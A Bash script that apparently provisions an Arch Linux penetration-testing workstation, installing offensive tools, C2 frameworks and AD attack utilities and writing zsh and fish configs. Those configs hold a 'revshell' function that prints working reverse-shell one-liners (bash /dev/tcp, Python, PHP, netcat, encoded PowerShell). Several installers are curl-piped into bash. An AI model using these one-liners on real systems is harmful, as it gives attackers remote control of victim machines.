#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# ========== Pretty colors & helpers ==========
ESCAPE_SEQ='\033['
RESET="${ESCAPE_SEQ}0m"
BOLD="${ESCAPE_SEQ}1m"

RED="${ESCAPE_SEQ}31m"
GREEN="${ESCAPE_SEQ}32m"
YELLOW="${ESCAPE_SEQ}33m"
BLUE="${ESCAPE_SEQ}34m"
CYAN="${ESCAPE_SEQ}36m"

info()    { printf "%b %b%s%b\n" "🛈" "${BOLD}${BLUE}" "$1" "${RESET}"; }
step()    { printf "%b %b%s%b\n" "▶" "${BOLD}${CYAN}" "$1" "${RESET}"; }
success() { printf "%b %b%s%b\n" "✔" "${BOLD}${GREEN}" "$1" "${RESET}"; }
warn()    { printf "%b %b%s%b\n" "⚠" "${BOLD}${YELLOW}" "$1" "${RESET}"; }
error()   { printf "%b %b%s%b\n" "✖" "${BOLD}${RED}" "$1" "${RESET}" >&2; }

on_exit() {
  local rc=$?
  if [ $rc -ne 0 ]; then
    error "Script exited with error code $rc"
  fi
}
trap on_exit EXIT

# ========== Configuration ==========

DEST_DIR="/opt"
REPOS=(
  "https://github.com/sham00n/buster.git"
  "https://github.com/xm1k3/cent.git"
  "https://github.com/BishopFox/cloudfox.git"
  "https://github.com/aquasecurity/cloudsploit.git"
  "https://github.com/cve-search/cve-search.git"
  "https://github.com/hahwul/dalfox.git"
  "https://github.com/imthaghost/goclone.git"
  "https://github.com/pemistahl/grex.git"
  "https://github.com/fortra/impacket.git"
  "https://github.com/ropnop/kerbrute.git"
  "https://github.com/deathmarine/Luyten.git"
  "https://github.com/samratashok/nishang.git"
  "https://github.com/ayadim/Nuclei-bug-hunter.git"
  "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
  "https://github.com/BishopFox/sliver.git"
  "https://github.com/trufflesecurity/trufflehog.git"
  "https://github.com/0xKayala/ParamSpider.git"
  "https://github.com/cathugger/mkp224o.git"
  "https://github.com/gotr00t0day/spyhunt.git"
  "https://github.com/trickest/cve.git"
  "https://github.com/Flangvik/SharpCollection.git"
  "https://github.com/urbanadventurer/username-anarchy.git"

  "https://github.com/x90skysn3k/brutespray.git"
  "https://github.com/GerbenJavado/LinkFinder.git"
  "https://github.com/hakluke/hakrawler.git"
  "https://github.com/danielmiessler/SecLists.git"
  "https://github.com/HavocFramework/Havoc.git"
  "https://github.com/Adaptix-Framework/AdaptixC2.git"
  "https://github.com/itm4n/PrivescCheck.git"
  "https://github.com/diego-treitos/linux-smart-enumeration.git"
  "https://github.com/ShutdownRepo/targetedKerberoast.git"
  "https://github.com/Leo4j/Invoke-ADEnum.git"
  "https://github.com/lefayjey/linWinPwn.git"
  "https://github.com/gitleaks/gitleaks.git"
  "https://github.com/semgrep/semgrep-rules.git"
  "https://github.com/nullsection/chisel-ng.git"
  "https://github.com/strayge/pylnk.git"
)

# Arch Linux package names (pacman)
PACMAN_PACKAGES=(
  curl wget gcc make base-devel fzf go python python-pip python-virtualenv
  python-pipx parallel jq unzip git docker docker-compose rust zsh tmux lsd
)


# ========== Utilities ==========
repo_name_from_url() {
  local url="$1"
  local base="${url##*/}"
  base="${base%.git}"
  base="${base%%/*}"
  printf '%s' "$base"
}

is_valid_git_url() {
  local url="$1"
  if [[ "$url" =~ ^https?:// ]] && [[ "$url" == *.git ]]; then
    return 0
  fi
  if [[ "$url" =~ ^git@ ]]; then
    return 0
  fi
  return 1
}


# ========== Dependency checks & install ==========
check_dependencies() {
  info "Checking for system dependencies (Arch Linux / pacman)..."

  # Ensure pacman is present — sanity check
  if ! command -v pacman &>/dev/null; then
    error "pacman not found. This script is designed for Arch Linux."
    return 1
  fi

  local missing_pacman=()
  for pkg in "${PACMAN_PACKAGES[@]}"; do
    case "$pkg" in
      docker-compose)
        if ! command -v docker-compose &>/dev/null && ! docker compose version &>/dev/null 2>&1; then
          missing_pacman+=("$pkg")
        fi
        ;;
      python-pipx)
        if ! command -v pipx &>/dev/null; then
          missing_pacman+=("$pkg")
        fi
        ;;
      go)
        if ! command -v go &>/dev/null; then
          missing_pacman+=("$pkg")
        fi
        ;;
      rust)
        if ! command -v cargo &>/dev/null; then
          missing_pacman+=("$pkg")
        fi
        ;;
      base-devel)
        # Check for gcc as proxy for base-devel
        if ! command -v gcc &>/dev/null; then
          missing_pacman+=("$pkg")
        fi
        ;;
      *)
        if ! pacman -Qi "$pkg" &>/dev/null 2>&1 && ! command -v "${pkg%%-*}" &>/dev/null; then
          missing_pacman+=("$pkg")
        fi
        ;;
    esac
  done

  if [ ${#missing_pacman[@]} -gt 0 ]; then
    warn "Missing pacman packages: ${missing_pacman[*]}"
    step "Installing missing packages via pacman (requires sudo)..."
    sudo pacman -Sy --noconfirm "${missing_pacman[@]}" || {
      error "Failed to install some pacman packages. Please install them manually and re-run."
      return 1
    }
  else
    success "All pacman dependencies present."
  fi

  # Docker service enable on Arch

  # Docker service enable on Arch
  if command -v docker &>/dev/null; then
    sudo systemctl enable --now docker.service 2>/dev/null || warn "Could not enable docker.service"
  fi

  success "Dependencies check complete."
  return 0
}

# ========== Git clone / update ==========
install_git_repos() {
  step "Preparing destination: $DEST_DIR"
  sudo mkdir -p "$DEST_DIR"
  sudo chown "$(id -u):$(id -g)" "$DEST_DIR" || true

  for repo in "${REPOS[@]}"; do
    if ! is_valid_git_url "$repo"; then
      warn "Skipping invalid/unsupported git URL: $repo"
      continue
    fi

    name=$(repo_name_from_url "$repo")
    target="$DEST_DIR/$name"

    if [ -d "$target/.git" ]; then
      info "Updating $name..."
      if ! git -C "$target" diff-index --quiet HEAD -- 2>/dev/null; then
        warn "$name has uncommitted changes. Skipping update."
        continue
      fi

      if git -C "$target" pull --ff-only --quiet 2>/dev/null; then
        success "Updated $name"
      else
        warn "git pull failed for $name — attempting fetch"
        git -C "$target" fetch --all --prune || warn "fetch failed for $name"
      fi
    else
      info "Cloning $name → $target"
      if git clone --depth 1 --quiet "$repo" "$target" 2>/dev/null; then
        success "Cloned $name"
      else
        warn "Clone failed for $repo. Skipping."
        continue
      fi
    fi

    chmod -R u+rwX,go+rX,go-w "$target" 2>/dev/null || true
  done
}

# ========== Go tools ==========
install_go_tools() {
  if ! command -v go &>/dev/null; then
    warn "Go not found in PATH. Skipping Go tool installs."
    return 0
  fi

  info "Installing Go tools (go env GOPATH: $(go env GOPATH 2>/dev/null || echo 'unset'))"
  export PATH="$(go env GOPATH 2>/dev/null)/bin:${PATH:-/usr/local/bin}"

  local go_tools=(
    "github.com/takshal/freq@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/takshal/bfxss@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/gron@latest"
    "github.com/hakluke/hakcheckurl@latest"
    "github.com/tomnomnom/httprobe@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/unfurl@latest"
    "github.com/ffuf/pencode/cmd/pencode@latest"
    "github.com/projectdiscovery/pdtm/cmd/pdtm@latest"
    "github.com/glitchedgitz/cook/v2/cmd/cook@latest"
    "github.com/GoToolSharing/htb-cli@latest"
    "github.com/ropnop/kerbrute@latest"
  )

  for tool in "${go_tools[@]}"; do
    local tool_name
    tool_name=$(basename "$tool" | cut -d@ -f1)
    step "Installing $tool_name..."
    if go install "$tool" 2>/dev/null; then
      success "Installed $tool_name"
    else
      warn "go install failed for $tool — continuing"
    fi
  done
}

# ========== Rust tools via cargo ==========
install_rust_tools() {
  if ! command -v cargo &>/dev/null; then
    warn "cargo not found in PATH. Skipping Rust tool installs."
    return 0
  fi
  info "Installing Rust tools (cargo home: ${CARGO_HOME:-$HOME/.cargo})"
  export PATH="${CARGO_HOME:-$HOME/.cargo}/bin:${PATH:-/usr/local/bin}"
  # RustHound-CE requires libclang at build time (bindgen dependency)
  if ! pacman -Qi clang &>/dev/null 2>&1; then
    step "Installing clang (required by rusthound-ce bindgen)..."
    sudo pacman -Sy --noconfirm clang || warn "Could not install clang — rusthound-ce may fail to compile"
  fi
  # Locate libclang.so and export LIBCLANG_PATH so bindgen can find it
  local _libclang
  _libclang=$(find /usr/lib /usr/lib64 -maxdepth 3 -name 'libclang.so*' 2>/dev/null | head -n1)
  if [ -n "$_libclang" ]; then
    export LIBCLANG_PATH="$(dirname "$_libclang")"
    info "LIBCLANG_PATH set to $LIBCLANG_PATH"
  else
    warn "libclang.so not found after clang install — rusthound-ce build may still fail"
  fi
  local rust_tools=(
    "https://github.com/g0h4n/RustHound-CE"
    "https://github.com/sharkdp/bat"
    "https://github.com/praetorian-inc/noseyparker"
  )
  for tool in "${rust_tools[@]}"; do
    local tool_name
    tool_name=$(basename "$tool")
    step "Installing $tool_name..."
    if cargo install --git "$tool" 2>/dev/null; then
      success "Installed $tool_name"
    else
      warn "cargo install failed for $tool — continuing"
    fi
  done
}

# ========== Python tools via pipx ==========
install_python_tools() {
  if ! command -v pipx &>/dev/null; then
    warn "pipx not found; skipping Python tool installs."
    return 0
  fi

  info "Installing Python tools via pipx..."
  local py_tools=(
    "git+https://github.com/AD-Security/AD_Miner.git"
    "git+https://github.com/dwisiswant0/apkleaks.git"
    "git+https://github.com/s0md3v/Arjun.git"
    "git+https://github.com/s0md3v/uro.git"
    "git+https://github.com/sherlock-project/sherlock.git"
    "git+https://github.com/brightio/penelope.git"
    "git+https://github.com/freelabz/secator.git"
    "git+https://github.com/CravateRouge/bloodyAD.git"
    "git+https://github.com/CravateRouge/autobloody.git"
    "git+https://github.com/Maxteabag/sqlit.git"
    "git+https://github.com/p0dalirius/Coercer.git"
    "git+https://github.com/blacklanternsecurity/baddns"
    "git+https://github.com/ShutdownRepo/pywhisker.git"
    "git+https://github.com/aniqfakhrul/powerview.py.git"
    "git+https://github.com/Hackndo/pyGPOAbuse.git"
    "git+https://github.com/shellinvictus/GriffonAD.git"
    "git+https://github.com/p0dalirius/smbclient-ng.git"
    "git+https://github.com/kasem545/ntlm_theft.git"
    "git+https://github.com/ly4k/Certipy.git"

  )

  for pkg in "${py_tools[@]}"; do
    local pkg_name
    pkg_name=$(basename "$pkg" .git)
    step "Installing $pkg_name..."
    if pipx install --force "$pkg" &>/dev/null; then
      success "Installed $pkg_name"
    else
      warn "pipx install failed for $pkg_name"
      pipx install "$pkg" 2>/dev/null || warn "pipx still failed for $pkg_name"
    fi
  done
}

# ========== exploitdb (go-exploitdb) ==========
exploitdb() {
  local repo_path="${GOPATH:-$HOME/go}/src/github.com/vulsio/go-exploitdb"
  step "Installing/updating go-exploitdb in $repo_path"
  mkdir -p "$(dirname "$repo_path")"
  if [ ! -d "$repo_path" ]; then
    if git clone --quiet https://github.com/vulsio/go-exploitdb.git "$repo_path" 2>/dev/null; then
      success "Cloned go-exploitdb"
    else
      warn "Failed to clone go-exploitdb"
      return 1
    fi
  else
    info "Updating go-exploitdb"
    git -C "$repo_path" pull --quiet 2>/dev/null || warn "Failed to update go-exploitdb"
  fi

  (cd "$repo_path" && make install &>/dev/null) && success "go-exploitdb installed" || warn "make install failed for go-exploitdb"
}

# ========== BlackArch repo ==========
add_blackarch_repo() {
  if grep -q '\[blackarch\]' /etc/pacman.conf 2>/dev/null; then
    info "BlackArch repo already present in /etc/pacman.conf — skipping."
    return 0
  fi

  if ! command -v curl &>/dev/null; then
    warn "curl not present; cannot add BlackArch repo automatically."
    return 1
  fi

  step "Adding BlackArch repository via official strap.sh..."
  local strap="/tmp/blackarch-strap.sh"
  if ! curl -fsSL https://blackarch.org/strap.sh -o "$strap"; then
    warn "Failed to download BlackArch strap.sh"
    return 1
  fi

  # Sanity-check: strap.sh must mention blackarch
  if ! grep -q 'blackarch' "$strap" 2>/dev/null; then
    warn "Downloaded strap.sh looks unexpected — aborting for safety."
    rm -f "$strap"
    return 1
  fi

  chmod +x "$strap"
  if sudo bash "$strap"; then
    success "BlackArch repo added and keyring installed."
  else
    warn "BlackArch strap.sh exited non-zero — review output above."
  fi
  rm -f "$strap"
}

# ========== BloodHound CLI ==========
install_bloodhound() {
  if ! command -v wget &>/dev/null; then
    warn "wget missing; cannot install bloodhound-cli automatically."
    return 0
  fi

  info "Installing BloodHound CLI (if available)"
  local tmp="/tmp/bloodhound-cli-linux-amd64.tar.gz"
  if wget -q -O "$tmp" "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz" 2>/dev/null; then
    sudo tar -xzf "$tmp" -C /usr/local/bin/ 2>/dev/null || warn "tar extraction warning"
    sudo chmod +x /usr/local/bin/bloodhound-cli 2>/dev/null || true

    if command -v docker &>/dev/null; then
      sudo usermod -aG docker "$USER" 2>/dev/null || true
    fi

    success "BloodHound CLI binary installed to /usr/local/bin/"
    rm -f "$tmp"
  else
    warn "Could not download BloodHound CLI release (maybe no internet or release missing)."
  fi
}

install_ronin() {
  info "Attempting Ronin install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -sSL "https://raw.githubusercontent.com/ronin-rb/scripts/main/ronin-install.sh" 2>/dev/null | bash; then
      success "Ronin installed"
    else
      warn "Ronin install script failed"
    fi
  else
    warn "curl not present; cannot install Ronin automatically."
  fi
}

install_java_8() {
  info "Checking Java 8 availability..."
  if pacman -Qi jdk8-openjdk &>/dev/null 2>&1; then
    info "jdk8-openjdk already installed."
    return 0
  fi
  # Fallback: manual download
  if command -v curl &>/dev/null; then
    if curl -o /tmp/openjdk-8u44-linux-x64.tar.gz -sSL \
        "https://download.java.net/openjdk/jdk8u44/ri/openjdk-8u44-linux-x64.tar.gz" 2>/dev/null; then
      tar -xzf /tmp/openjdk-8u44-linux-x64.tar.gz -C /tmp/ 2>/dev/null || warn "Java tar extraction warning"
      sudo mkdir -p /usr/lib/jvm
      sudo mv /tmp/java-se-8u44-ri /usr/lib/jvm/java-se-8 2>/dev/null || warn "Java mv warning"
      sudo ln -sf /usr/lib/jvm/java-se-8/bin/java /usr/local/bin/java 2>/dev/null || warn "symlink warning"
      success "Java 8 installed (manual)"
    else
      warn "Java 8 download failed"
    fi
  else
    warn "curl not present; cannot install Java 8 automatically."
  fi
}

install_ysoserial_jar() {
  info "Attempting ysoserial-jar install"
  if command -v curl &>/dev/null; then
    if curl -o "$DEST_DIR/ysoserial-all.jar" -sSL \
        "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" 2>/dev/null; then
      success "ysoserial-jar installed"
    else
      warn "ysoserial-jar download failed"
    fi
  else
    warn "curl not present; cannot install ysoserial-jar automatically."
  fi
}

install_ysoserial_net() {
  info "Attempting ysoserial-net install"
  if command -v curl &>/dev/null; then
    if curl -o "$DEST_DIR/ysoserial-net.zip" -sSL \
        "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip" 2>/dev/null; then
      unzip -oq "$DEST_DIR/ysoserial-net.zip" -d "$DEST_DIR/ysoserial-net" 2>/dev/null || warn "ysoserial-net unzip warning"
      mv "$DEST_DIR/ysoserial-net/Release/"* "$DEST_DIR/ysoserial-net/" 2>/dev/null || true
      rm -rf "$DEST_DIR/ysoserial-net/Release"
      rm -f "$DEST_DIR/ysoserial-net.zip"
      success "ysoserial-net installed"
    else
      warn "ysoserial-net download failed"
    fi
  else
    warn "curl not present; cannot install ysoserial-net automatically."
  fi
}

install_opengrep() {
  info "Attempting opengrep install"
  if command -v curl &>/dev/null; then
    if curl -fsSL https://raw.githubusercontent.com/opengrep/opengrep/main/install.sh 2>/dev/null | bash; then
      success "Opengrep installed"
    else
      warn "Opengrep install script failed"
    fi
  else
    warn "curl not present; cannot install Opengrep automatically."
  fi
}

install_witr() {
  info "Attempting Witr install"
  if command -v curl &>/dev/null; then
    if curl -sSL "https://raw.githubusercontent.com/pranshuparmar/witr/main/install.sh" 2>/dev/null | bash; then
      success "Witr installed"
    else
      warn "Witr install script failed"
    fi
  else
    warn "curl not present; cannot install Witr automatically."
  fi
}

install_spf() {
  info "Attempting SPF (superfile) install"
  if command -v curl &>/dev/null; then
    if curl -sLo- https://superfile.dev/install.sh 2>/dev/null | bash; then
      success "SPF installed"
    else
      warn "SPF install script failed"
    fi
  else
    warn "curl not present; cannot install SPF automatically."
  fi
}

font_packages_install() {
  local font_dir="${HOME}/.local/share/fonts"
  local tmp="/tmp/hack-nerd-font.zip"
  local url="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.4.0/Hack.zip"

  step "Preparing font directory: $font_dir"
  mkdir -p "$font_dir" || { error "mkdir failed"; return 1; }

  info "Installing Hack Nerd Font"

  if ! command -v unzip &>/dev/null; then
    warn "unzip not found. Installing via pacman..."
    sudo pacman -Sy --noconfirm unzip || {
      error "Failed to install unzip. Aborting font install."
      return 1
    }
  fi

  if command -v wget &>/dev/null; then
    step "Downloading Hack Nerd Font..."
    if wget -q -O "$tmp" "$url" 2>/dev/null; then
      step "Extracting fonts to $font_dir..."
      unzip -oq "$tmp" -d "$font_dir" 2>/dev/null || warn "Font extraction warning"
      fc-cache -fv >/dev/null 2>&1 || true
      success "Hack Nerd Font installed successfully."
      rm -f "$tmp"
    else
      error "Failed to download font from $url"
      return 1
    fi
  elif command -v curl &>/dev/null; then
    step "Downloading Hack Nerd Font (via curl)..."
    if curl -fsSL -o "$tmp" "$url" 2>/dev/null; then
      unzip -oq "$tmp" -d "$font_dir" 2>/dev/null || warn "Font extraction warning"
      fc-cache -fv >/dev/null 2>&1 || true
      success "Hack Nerd Font installed successfully."
      rm -f "$tmp"
    else
      error "Failed to download font from $url"
      return 1
    fi
  else
    error "Neither wget nor curl found. Cannot download font."
    return 1
  fi
}

# ========== Shell detection ==========
detect_shell() {
  # Check the user's default shell from /etc/passwd or $SHELL
  local user_shell
  user_shell=$(getent passwd "$USER" 2>/dev/null | cut -d: -f7 || echo "${SHELL:-}")
  case "$user_shell" in
    */fish) echo "fish" ;;
    */zsh)  echo "zsh"  ;;
    */bash) echo "bash" ;;
    *)
      # Fallback: check if shells are installed, prefer fish then zsh
      if command -v fish &>/dev/null; then echo "fish"
      elif command -v zsh &>/dev/null; then echo "zsh"
      else echo "bash"
      fi
      ;;
  esac
}

# ========== Oh My Zsh + plugins ==========
install_oh_my_zsh() {
  if [ -d "${HOME}/.oh-my-zsh" ]; then
    info "oh-my-zsh already installed."
    return 0
  fi

  if ! command -v zsh &>/dev/null; then
    warn "zsh not installed. Installing via pacman..."
    sudo pacman -Sy --noconfirm zsh || {
      error "Failed to install zsh"
      return 1
    }
  fi

  step "Installing oh-my-zsh (non-interactive)"
  export RUNZSH="no" CHSH="no"
  if command -v curl &>/dev/null; then
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
      warn "oh-my-zsh install script failed"
      return 1
    }
  else
    sh -c "$(wget -qO- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
      warn "oh-my-zsh install script failed"
      return 1
    }
  fi

  git clone --quiet https://github.com/zsh-users/zsh-autosuggestions.git \
    "${HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions" 2>/dev/null || warn "zsh-autosuggestions install failed"
  git clone --quiet https://github.com/zsh-users/zsh-syntax-highlighting.git \
    "${HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" 2>/dev/null || warn "zsh-syntax-highlighting install failed"
  curl -o "${HOME}/.oh-my-zsh/custom/themes/parrot.zsh-theme" \
    -fsSL https://raw.githubusercontent.com/trabdlkarim/parrot-zsh-theme/refs/heads/main/parrot.zsh-theme \
    2>/dev/null || warn "parrot theme install failed"

  success "oh-my-zsh installed."
}

install_tmux_conf() {
  if [ -d "${HOME}/.tmux" ] && [ -f "${HOME}/.tmux.conf" ]; then
    info "tmux config (gpakosz) appears already installed."
    return 0
  fi

  if ! command -v tmux &>/dev/null; then
    warn "tmux not installed. Install it first."
    return 0
  fi

  step "Installing gpakosz/.tmux config"
  cd ~ || return 1
  git clone --quiet https://github.com/gpakosz/.tmux.git 2>/dev/null || {
    warn "Failed to clone .tmux repo"
    return 1
  }
  ln -s -f .tmux/.tmux.conf .tmux.conf 2>/dev/null || true
  cp .tmux/.tmux.conf.local . 2>/dev/null || true

  success "tmux config installed (gpakosz)."
}

# ========== ZSH config ==========
install_zshrc_template() {
  local zshrc_path="${HOME}/.zshrc"
  local backup="${zshrc_path}.bak.$(date +%s)"

  if [ -f "$zshrc_path" ]; then
    step "Backing up existing .zshrc → $backup"
    cp -a "$zshrc_path" "$backup" || warn "Could not back up existing .zshrc"
  fi

  step "Writing new ~/.zshrc from template"
  cat > "$zshrc_path" <<'EOF'
# Path to your Oh My Zsh installation.
export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load
ZSH_THEME="parrot"

# Plugins
plugins=(zsh-autosuggestions zsh-syntax-highlighting fzf)

source $ZSH/oh-my-zsh.sh

# User configuration
export GOPATH="${HOME}/go"
export PATH="${GOPATH}/bin:${PATH}:${HOME}/.local/bin"
export PATH="$PATH:$HOME/.cargo/bin"

# Generated for pdtm. Do not edit.
export PATH=$PATH:$HOME/.pdtm/go/bin

##### Custom Aliases and Functions
alias myip='curl ifconfig.me'

######################### RevShell Function START #################################
revshell(){
  ip=$1; port=$2;

  bash_shell="/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  shell_encode=$(echo "$bash_shell" | base64 -w 0)

  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

  ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

  echo -e "\n[+] busybox: busybox nc $ip $port -e sh"
  echo -e "[+] Java Runtime().exec: bash -c \$@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo -e "[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo -e "[+] Bash Encoded: echo \"$shell_encode\" | base64 -d | /usr/bin/bash"
  echo -e "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
  echo -e "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
  echo -e "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
  echo -e "[+] PowerShell (Base64): powershell -e $ps_base64"
}
######################### RevShell Function END #################################


######################### Aliases START #########################
alias ls='lsd'
alias l='lsd -l'
alias la='lsd -a'
alias lla='lsd -la'
alias lt='lsd --tree'
######################### Aliases END ##########################


######################### Environment variables START ########################
export HTB_TOKEN=""
export VMIP=""
export IP=""
######################### Environment variables END ########################
EOF

  chmod 644 "$zshrc_path" 2>/dev/null || true
  success "~/.zshrc written."
}

# ========== Fish config ==========
install_fish_config() {
  if ! command -v fish &>/dev/null; then
    warn "fish not found. Installing via pacman..."
    sudo pacman -Sy --noconfirm fish || {
      error "Failed to install fish"
      return 1
    }
  fi

  local fish_conf_dir="${HOME}/.config/fish"
  local fish_func_dir="${fish_conf_dir}/functions"
  local fish_conf_file="${fish_conf_dir}/config.fish"
  local backup="${fish_conf_file}.bak.$(date +%s)"

  mkdir -p "$fish_func_dir"

  if [ -f "$fish_conf_file" ]; then
    step "Backing up existing config.fish → $backup"
    cp -a "$fish_conf_file" "$backup" || warn "Could not back up existing config.fish"
  fi

  # ---- revshell function ----
  cat > "${fish_func_dir}/revshell.fish" <<'FISHEOF'
function revshell --description "Print reverse shell one-liners for given IP and PORT"
    if test (count $argv) -lt 2
        echo "Usage: revshell <ip> <port>"
        return 1
    end

    set ip $argv[1]
    set port $argv[2]

    set bash_shell "/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
    set shell_encode (echo $bash_shell | base64 -w 0)

    set ps_cmd "\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    set ps_base64 (echo $ps_cmd | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

    echo ""
    echo "[+] busybox:             busybox nc $ip $port -e sh"
    echo "[+] Java Runtime().exec: bash -c \$@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "[+] Bash:                /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "[+] Bash Encoded:        echo \"$shell_encode\" | base64 -d | /usr/bin/bash"
    echo "[+] Python:              python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "[+] PHP:                 php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    echo "[+] Netcat FIFO:         rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
    echo "[+] PowerShell (Base64): powershell -e $ps_base64"
end
FISHEOF

  # ---- config.fish ----
  cat > "$fish_conf_file" <<'FISHEOF'
# ===== PATH =====
set -gx GOPATH $HOME/go
fish_add_path $GOPATH/bin
fish_add_path $HOME/.local/bin
fish_add_path $HOME/.cargo/bin
fish_add_path $HOME/.pdtm/go/bin

# ===== Aliases =====
alias myip 'curl ifconfig.me'
alias ls 'lsd'
alias l 'lsd -l'
alias la 'lsd -a'
alias lla 'lsd -la'
alias lt 'lsd --tree'

# ===== Environment variables =====
set -gx HTB_TOKEN ""
set -gx VMIP ""
set -gx IP ""
FISHEOF

  # ---- fisher + tide prompt (optional but nice) ----
  if command -v fish &>/dev/null; then
    step "Installing Fisher plugin manager for fish..."
    fish -c "curl -sL https://raw.githubusercontent.com/jorgebucaran/fisher/main/functions/fisher.fish | source && fisher install jorgebucaran/fisher" 2>/dev/null \
      && success "Fisher installed" \
      || warn "Fisher install failed (non-fatal)"

    step "Installing tide prompt for fish..."
    fish -c "fisher install IlanCosman/tide@v6" 2>/dev/null \
      && success "Tide prompt installed" \
      || warn "Tide prompt install failed (non-fatal)"

    step "Installing fish fzf integration..."
    fish -c "fisher install patrickF1/fzf.fish" 2>/dev/null \
      && success "fzf.fish installed" \
      || warn "fzf.fish install failed (non-fatal)"
  fi

  chmod 644 "$fish_conf_file" 2>/dev/null || true
  success "Fish config written to $fish_conf_file"
  success "revshell function written to ${fish_func_dir}/revshell.fish"
}

# ========== Shell config dispatcher ==========
install_shell_config() {
  local detected_shell
  detected_shell=$(detect_shell)
  info "Detected shell: $detected_shell"

  case "$detected_shell" in
    fish)
      step "Configuring Fish shell..."
      install_fish_config
      ;;
    zsh)
      step "Configuring Zsh shell..."
      install_oh_my_zsh
      install_zshrc_template
      ;;
    *)
      warn "Shell '$detected_shell' not specifically handled. Installing both zsh and fish configs..."
      install_oh_my_zsh
      install_zshrc_template
      install_fish_config
      ;;
  esac
}

# ========== MAIN ==========
main() {
  info "Starting Arch Linux installer"
  echo ""

  add_blackarch_repo
  echo ""
  check_dependencies
  echo ""
  font_packages_install
  echo ""
  install_git_repos
  echo ""
  install_go_tools
  echo ""
  install_rust_tools
  echo ""
  install_python_tools
  echo ""
  exploitdb
  echo ""
  install_bloodhound
  echo ""
  install_ronin
  echo ""
  install_java_8
  echo ""
  install_ysoserial_jar
  echo ""
  install_ysoserial_net
  echo ""
  install_opengrep
  echo ""
  install_witr
  echo ""
  install_spf
  echo ""
  install_tmux_conf
  echo ""
  install_shell_config
  echo ""

  success "All done — repos + tools attempted. Inspect the output for any warnings."
  info "Tips: Run this as a user with sudo privileges. Some installs (docker, go) may need manual follow-up."
  info "To set fish as default shell: chsh -s \$(which fish)"
  info "To set zsh as default shell:  chsh -s \$(which zsh)"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi
